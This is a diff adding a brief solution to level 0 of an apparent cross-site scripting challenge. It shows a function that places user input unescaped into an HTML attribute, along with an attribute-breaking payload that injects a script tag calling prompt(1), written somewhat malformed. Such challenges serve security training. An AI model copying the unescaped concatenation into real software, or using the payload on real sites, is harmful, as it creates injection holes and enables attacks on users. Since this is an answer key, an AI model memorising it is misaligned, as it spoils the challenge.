@@ -1,0 +1,13 @@
+Level 0
+
+function escape(input) {
+    // warm up
+    // script should be executed without user interaction
+    return '<input type="text" value="' + input + '">';
+}
+
+Solution:- 
+
+Use the simple and understandable script:-
+          
+  "><script><prompt(1)></script>
